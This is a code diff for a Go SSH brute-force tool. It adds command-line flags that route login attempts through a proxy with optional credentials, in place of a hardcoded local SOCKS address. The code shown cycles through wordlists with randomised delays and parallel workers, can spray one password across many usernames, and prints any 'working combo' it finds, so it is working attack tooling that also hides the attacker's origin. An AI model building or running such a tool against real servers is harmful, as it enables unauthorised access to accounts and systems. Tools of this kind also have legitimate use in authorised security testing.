@@ -10,6 +10,7 @@ import (
 	"net"
 	"os"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 )
@@ -17,6 +18,7 @@ import (
 var sem = make(chan struct{}, 1)
 var wg sync.WaitGroup
 var operationDone = false
+var globalproxy ProxySettings
 
 type ProxySettings struct {
 	ip       string
@@ -80,7 +82,6 @@ func sshlogin(addr string, username string, password string, timeout int64, prox
 
 func runWordlistPart(addr string, list []string, username string, timeout int64, inverted bool) {
 	time.Sleep(time.Duration(rand.Float64() * float64(time.Second)))
-	proxysetting := ProxySettings{ip: "127.0.0.1", port: 1080}
 	for _, wordlistline := range list {
 		time.Sleep(time.Duration(rand.Float64() * float64(time.Second) / 2))
 		if operationDone {
@@ -92,7 +93,7 @@ func runWordlistPart(addr string, list []string, username string, timeout int64,
 			usr = wordlistline
 			pwd = username // Not the best naming I know :D
 		}
-		if sshlogin(addr, usr, pwd, timeout, proxysetting) {
+		if sshlogin(addr, usr, pwd, timeout, globalproxy) {
 			fmt.Println("================================")
 			fmt.Println(" Found working combo")
 			fmt.Println(" Username: " + usr)
@@ -148,6 +149,9 @@ func main() {
 	workerCount := 10
 	timeout := 3
 	inverted := false
+	globalproxy = ProxySettings{ip: "", port: 0}
+	proxyaddr := ""
+	proxycreds := ""
 
 	rand.Seed(time.Now().UnixNano())
 	flag.StringVar(&addr, "h", "127.0.0.1", "Specify Hostname or ip. Default is 127.0.0.1")
@@ -157,10 +161,31 @@ func main() {
 	flag.IntVar(&timeout, "t", 3, "Specify Timeout. Default is 3")
 	flag.BoolVar(&inverted, "i", false, "Specify Inversion mode, bruteforce username with one password. Default is false")
 	flag.StringVar(&wordlistPath, "w", "./smalllist.txt", "Specify wordlist. Default is ./smalllist.txt")
+	flag.StringVar(&proxyaddr, "proxy", "", "Specify proxy in format ip:port. Default is no proxy usage")
+	flag.StringVar(&proxycreds, "proxy-credentials", "", "Specify proxy credentials in format username:password. Default is empty")
 	flag.Usage = func() {
 		flag.PrintDefaults() // prints default usage
 	}
 	flag.Parse()
+	pos := strings.Index(proxyaddr, ":")
+	if pos != -1 {
+		globalproxy.ip = proxyaddr[0:pos]
+		portproxy, err := strconv.Atoi(proxyaddr[pos+1 : len(proxyaddr)])
+		if err != nil {
+			fmt.Println(" Error while parsing proxy. must be in format ip:port to be used!")
+			os.Exit(1)
+			return
+		}
+		globalproxy.port = portproxy
+	}
+	if globalproxy.ip != "" && proxycreds != "" {
+		pos = strings.Index(proxycreds, ":")
+		if pos != -1 {
+			globalproxy.username = proxycreds[0:pos]
+			globalproxy.password = proxycreds[pos+1 : len(proxycreds)]
+		}
+	}
+
 	fmt.Println("                                                                                        ")
 	fmt.Println("  _|_|_|_|  _|_|_|_|  _|    _|    _|_|_|    _|                                          ")
 	fmt.Println("  _|        _|        _|    _|  _|        _|_|_|_|    _|_|    _|  _|_|  _|_|_|  _|_|    ")
